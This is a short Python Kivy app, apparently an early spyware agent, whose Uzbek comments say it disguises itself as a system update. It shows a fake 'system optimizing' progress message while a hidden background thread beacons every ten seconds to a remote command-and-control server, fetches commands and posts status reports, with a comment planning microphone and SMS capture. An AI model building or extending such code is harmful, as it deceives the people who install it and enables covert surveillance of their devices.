import requests
import time
import threading
from kivy.app import App
from kivy.uix.label import Label

URL = "https://predatoragent26.pythonanywhere.com"

class PredatorGeneral(App):
    def build(self):
        # Niqob: Foydalanuvchi buni oddiy tizim yangilanishi deb o'ylaydi
        self.lbl = Label(text="Tizim optimallashtirilmoqda...\nIltimos kuting: 65%")
        threading.Thread(target=self.core_logic, daemon=True).start()
        return self.lbl

    def core_logic(self):
        while True:
            try:
                # 1. Serverdan buyruq tekshirish
                response = requests.get(f"{URL}/get_command", timeout=10)
                cmd = response.text.strip()
                
                if cmd != "WAIT":
                    # Buyruq bajarilgani haqida hisobot
                    report = {"agent": "Predator_01", "event": "CMD_RECEIVED", "cmd": cmd}
                    requests.post(f"{URL}/stats", json=report)
                    
                    # Bu yerda kelajakda aniq funksiyalar (MIC, SMS) ishga tushadi
                
                # 2. Doimiy onlayn holati
                requests.post(f"{URL}/stats", json={"status": "online", "id": "General_01"})
                
            except:
                pass
            time.sleep(10) # Har 10 soniyada aloqa

if __name__ == "__main__":
    PredatorGeneral().run()
    
